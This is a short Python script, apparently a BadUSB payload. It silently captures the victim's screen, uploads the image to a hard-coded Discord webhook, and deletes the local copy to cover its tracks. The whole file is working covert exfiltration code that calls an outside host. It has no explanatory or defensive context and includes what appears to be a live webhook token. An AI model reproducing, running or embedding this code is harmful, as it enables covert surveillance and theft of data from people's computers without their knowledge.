import pyautogui
import requests
import os
import screeninfo

screen = screeninfo.get_monitors()[0]
screen_width, screen_height = screen.width, screen.height

screenshot = pyautogui.screenshot()
screenshot.save('badusbscreenshot.png')

webhook_url = 'https://discord.com/api/webhooks/1210798391794339860/y2YW6RXGeL6vPmSugT3UMOy7bRuFWjz1-su0V_7Td54I1K6jT0nim8aYFOAbXLN5xFQK'
with open('badusbscreenshot.png', 'rb') as file:
    response = requests.post(webhook_url, files={'file': file})

os.remove('badusbscreenshot.png')